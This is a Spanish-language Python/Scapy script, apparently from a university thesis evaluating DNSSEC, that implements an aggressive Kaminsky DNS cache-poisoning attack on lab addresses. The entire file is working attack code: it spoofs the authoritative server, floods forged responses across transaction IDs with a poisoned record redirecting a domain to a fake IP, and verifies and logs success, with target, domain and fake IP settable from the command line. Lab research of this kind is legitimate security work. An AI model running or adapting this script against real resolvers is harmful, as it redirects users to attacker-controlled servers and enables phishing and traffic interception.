#!/usr/bin/env python3
# ============================================================
#  kaminsky.py — Ataque de Envenenamiento de Caché DNS
#  Versión agresiva para laboratorio con delay simulado
#  Tesis: Evaluación de la robustez de DNSSEC
#  UTN — Brian Steve Rea Arias
# ============================================================

from scapy.all import *
import random, time, threading, argparse, sys, csv
from datetime import datetime

DNS_RECURSIVO    = "192.168.20.10"
DNS_AUTORITATIVO = "192.168.30.20"
DOMINIO_VICTIMA  = "web-corporativo.empresa.local"
IP_FALSA         = "192.168.10.66"
INTENTOS_MAX     = 2000
VELOCIDAD        = 2000   # paquetes por segundo — más agresivo

resultados = {"intentos": 0, "exito": False, "tiempo_inicio": None}
log_file   = "/tmp/kaminsky_resultados.csv"

def verificar_cache_envenenado():
    try:
        resp = sr1(
            IP(dst=DNS_RECURSIVO)/UDP(dport=53)/
            DNS(rd=1, qd=DNSQR(qname=DOMINIO_VICTIMA, qtype="A")),
            timeout=3, verbose=0
        )
        if resp and resp.haslayer(DNSRR):
            return str(resp[DNSRR].rdata)
    except:
        pass
    return None

def inundar_ids(subdomain, duracion=0.4):
    """
    Inunda con respuestas falsas durante 'duracion' segundos
    cubriendo todos los IDs de transacción posibles (0-65535)
    """
    fin = time.time() + duracion
    paquetes = []

    # Pre-construir paquetes para todos los IDs
    for tid in range(0, 65536, 10):  # cada 10 IDs
        pkt = (
            IP(src=DNS_AUTORITATIVO, dst=DNS_RECURSIVO)/
            UDP(sport=53, dport=random.randint(1024, 65535))/
            DNS(
                id=tid,
                qr=1, aa=1, rd=0,
                qd=DNSQR(qname=f"{subdomain}.{DOMINIO_VICTIMA}"),
                an=DNSRR(
                    rrname=f"{subdomain}.{DOMINIO_VICTIMA}",
                    type="A", ttl=3600, rdata=IP_FALSA
                ),
                ar=DNSRR(
                    rrname=DOMINIO_VICTIMA,
                    type="A", ttl=3600, rdata=IP_FALSA
                )
            )
        )
        paquetes.append(pkt)

    # Enviar en burst mientras dure la ventana
    while time.time() < fin:
        send(paquetes, verbose=0, inter=0)

def disparar_consulta(subdomain):
    """Envía consulta al recursivo para forzar que consulte al autoritativo"""
    try:
        send(
            IP(dst=DNS_RECURSIVO)/UDP(dport=53)/
            DNS(rd=1, qd=DNSQR(qname=f"{subdomain}.{DOMINIO_VICTIMA}", qtype="A")),
            verbose=0
        )
    except:
        pass

def ataque_kaminsky():
    print("=" * 60)
    print("  ATAQUE KAMINSKY AGRESIVO — Envenenamiento de Caché DNS")
    print(f"  Objetivo   : {DNS_RECURSIVO}")
    print(f"  Dominio    : {DOMINIO_VICTIMA}")
    print(f"  IP falsa   : {IP_FALSA}")
    print(f"  Intentos   : {INTENTOS_MAX}")
    print(f"  Modo       : Burst completo (0-65535 IDs por intento)")
    print("=" * 60)

    resultados["tiempo_inicio"] = datetime.now()

    with open(log_file, 'w', newline='') as f:
        writer = csv.writer(f)
        writer.writerow(["intento", "timestamp", "ip_cache", "envenenado"])

    for i in range(1, INTENTOS_MAX + 1):
        resultados["intentos"] = i
        subdomain = f"sub{random.randint(100000, 999999)}"

        # 1. Disparar consulta al recursivo (en hilo separado)
        t = threading.Thread(target=disparar_consulta, args=(subdomain,))
        t.daemon = True
        t.start()

        # 2. Inmediatamente inundar con respuestas falsas
        # La ventana es el tiempo que tarda el autoritativo en responder
        inundar_ids(subdomain, duracion=0.35)

        # 3. Verificar cada 10 intentos
        if i % 10 == 0:
            ip_actual = verificar_cache_envenenado()
            envenenado = (ip_actual == IP_FALSA)
            ts = datetime.now().strftime("%H:%M:%S")

            with open(log_file, 'a', newline='') as f:
                writer = csv.writer(f)
                writer.writerow([i, ts, ip_actual, "SI" if envenenado else "NO"])

            estado = "✓ ENVENENADO" if envenenado else "✗ aún limpio"
            print(f"  Intento {i:4d} | IP en caché: {ip_actual} | {estado}")

            if envenenado:
                tiempo = (datetime.now() - resultados["tiempo_inicio"]).seconds
                resultados["exito"] = True
                print()
                print("=" * 60)
                print(f"  ✓ ATAQUE EXITOSO en {tiempo} segundos")
                print(f"  Caché del recursivo apunta a {IP_FALSA}")
                print(f"  Clientes redirigidos al servidor falso")
                print(f"  Resultados: {log_file}")
                print("=" * 60)
                return True

        time.sleep(0.05)  # pequeña pausa entre intentos

    print(f"\n  Ataque terminado — {INTENTOS_MAX} intentos")
    print(f"  (Con DNSSEC activo este resultado es el esperado)")
    return False

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--target",   default=DNS_RECURSIVO)
    parser.add_argument("--dominio",  default=DOMINIO_VICTIMA)
    parser.add_argument("--ip-falsa", default=IP_FALSA)
    parser.add_argument("--intentos", type=int, default=INTENTOS_MAX)
    args = parser.parse_args()

    DNS_RECURSIVO   = args.target
    DOMINIO_VICTIMA = args.dominio
    IP_FALSA        = args.ip_falsa
    INTENTOS_MAX    = args.intentos

    ataque_kaminsky()
